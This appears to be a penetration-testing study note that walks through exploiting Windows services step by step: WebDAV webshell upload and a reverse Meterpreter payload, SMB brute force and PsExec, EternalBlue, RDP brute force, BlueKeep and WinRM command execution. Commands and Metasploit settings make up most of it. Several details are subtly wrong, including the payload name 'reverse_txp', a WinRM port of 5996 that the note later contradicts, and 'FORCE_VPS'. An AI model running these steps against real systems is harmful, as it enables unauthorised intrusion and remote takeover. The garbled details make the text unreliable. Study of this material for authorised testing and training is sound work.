## Frequently Exploited Windows Services
- IIS: 80
- WebDAV: 80/443
- SMB/CIFS: 445
- RDP: 3389
- WinRM: 5996/443

## Microsoft IIS WebDAV
- **IIS**
	- Internet Information Services
	- Web Server developed by Microsoft
	- Prts 80/443
	- Static and dynamic pages ASP.NET and PHP
	- Supported files:
		- asp
		- aspx
		- config
		- php
- **WebDAV**
	- Web-based Distributed Authoring and Versioning
	- Collaboratively edit and manage files on remote web server
	- runs of top of IIS
	- need creds to access it

### Exploitation
- Identify WebDAV
	- Can be done with #tools/multi/nmap
- Brute force credentials
	- Use Hydra ![[Hydra#WebDAV]]
- upload malicious files
	- Test files that can be uploaded with #tools/exploit/web/davtest
		```
		# davtest -url http://<ip_addr>/webdav -auth <username>:<password>
		```
	- Find the appropriate webshell from `/usr/share/webshells`
	- Upload the malicious file with #tools/exploit/web/cadaver
		```
		# cadaver http://<ip_addr>/webdav
		> put /usr/share/webshells/<selected_shell>
		```

### Exploitation w/ Metasploit
- Run #tools/multi/nmap and confirm that the IIS server is running and that there is WebDAV present
- Using #tools/payloads/msfvenom to generate a payload
	```
	# msfvenom -p windows/meterpreter/reverse_txp LHOST=<your_ip> LPORT=<port> -f asp > shell.asp
	```
	> If you don't know the architecture of target machine use a 32 bit payload as it runs on both 32 and 64 bit machine
- Upload the payload 
	- using #tools/exploit/web/cadaver  OR
	- Start #tools/multi/msfconsole 
		```
		> search iis upload
		> use exploit/windows/iis/iis_webdav_upload_asp
		> set LHOST
		> set LPORT
		> set httpusername
		> set httppassword
		> set RHOSTS
		> set RPORT	
		```
- Start #tools/multi/msfconsole 
	```
	> use multi/handler
	> set payload windows/meterpreter/reverse_tcp # same as the one that you used to create the payload
	> set LHOST <your_ip>
	> set LPORT <port>
	> run
	```

## SMB w/ PsExec
- **SMB**
	- Server Message Block
	- Port 445 and 139
	- Allows communication between machines in LAN
	- SAMBA is opensource linux implementation of SMB (allows to exchange files between Windows and Linux)
	- Authentication
		- User: uname and pwd to access a share
		- Share: needs a pwd to access a restricted share
- **PsExec**
	- Lightweight Telnet that allows to execute processes on remote windows systems using any user's creds
	- Its authentication is performed via SMB
	- You need to identify legitimate users and their passwords/hashes
		- SMB brute force or other tools

### Exploitation
- Run #tools/multi/nmap scan 
- For brute forcing credentials, start #tools/multi/msfconsole 
	```
	> search smb_login
	> use auxiliary/scanner/smb/smb_login
	> set user/file, pass/file, rhosts, verbose  	
	```
- Final exploit
	- Using #tools/exploit/psexec_py:
		```
		# psexec.py user@<ip_addr> <command> 
		```
		- You can simply provide `cmd.exe` as command
	- Using #tools/multi/msfconsole :
		```
		> search psexec
		> use exploit/windows/smb/psexec
		> set options
		```
		> Can be detected by AVs

## MS17-010 SMB - EternalBlue
- Allows attackers to execute remote arbitrary code
- Provides elevated access
#### Exploitaiton
- Run #tools/multi/nmap scan with `--script=smb-vuln-ms17-010` 
- Start #tools/exploit/smb/AutoExploit by selecting the script according to the target OS version
	```
	# shellcode/shell_prep.sh
	Y
	<your_ip>
	<your_port>
	<your_port>
	1
	1
	```
- Start `nc -nlvp <your_port>`
- Start the exploit script based on target OS
	```
	python3 eternalblue_exploit[ ].py <target_ip> shellcode/sc_x64.bin
	```
 - OR using #tools/multi/msfconsole , search for `eternalblue`
	 - use `exploit/windows/smb/ms17_010_eternalblue` and set the options
	 - Run

## RDP
- Proprietary GUI remote access
- Port 3389
- Requires authentication w/ password in clear-text

### Exploitation
*Run #tools/multi/nmap and look for RDP related ports*
- Use #tools/multi/msfconsole to verify RDP port
	```
	use auxiliary/scanner/rdp/rdp_scanner
	set rhosts, rport
	```
- Use #tools/bruteforce/hydra to brute force username/password (*Make sure you are not too fast as it might crash the target machine*)	
	- ![[Hydra#RDP]]
- Use #tools/utility/xfreerdp to access the machine via RDP:
	```
	# xfreerdp /u:<username> /p:<passwor> /v:<ip_addr>:<port>
	```

## CVE-2019-0708 - BlueKeep
- RDP vulnerability aloowing remote code exection
- Acess chunk of kernel memory at the system level without authentication
- Needs RDP to be enabled on target machine
- This causes target machine to crash

### Exploitation
*Run an #tools/multi/nmap to look for any port having RDP open*
- Go to #tools/multi/msfconsole and look for `cve_2019_0708_bluekeep`
	- Set the options and run it
	- This will tell if the target machine is vulnerable to this exploit
- Look for `cve_2019_0708_bluekeep_rce` (*this works only on 64 bit architectures*):
	- Set the options 
	- Change the `targets` based on the the target's architecture
	- Run

## WinRM
- Windows Remote Management over HTTP(S)
- Ports 5985 and 5986
- Not configured to run by default
- Does not get detected by normal nmap scan, use `-p-`

### Exploitation
*Run a #tools/multi/nmap scan with `-p5985` because it is not scanned by default*
- Run #tools/exploit/multi/crackmapexec to brute-force password
	```
	# crackmapexec winrm <ip_addr> -u <username> -p <wordlist> 
	```
- Use #tools/exploit/multi/crackmapexec to run commands:
	```
	# crackmapexec winrm <ip_addr> -u <username> -p <password> -x <command>
	```
- Use #tools/exploit/windows/evil-winrm_rb to gain reverse shell
	```
	# evil-winrm.rb -u <username> -p <password> -i <ip_addr>
	```
- With #tools/multi/msfconsole search for `winrm_script_exec`
	- Default payload is 32 bit but can be changed to 64
	- set the options and `FORCE_VPS` to True
	- Keep trying as it might take multiple attempts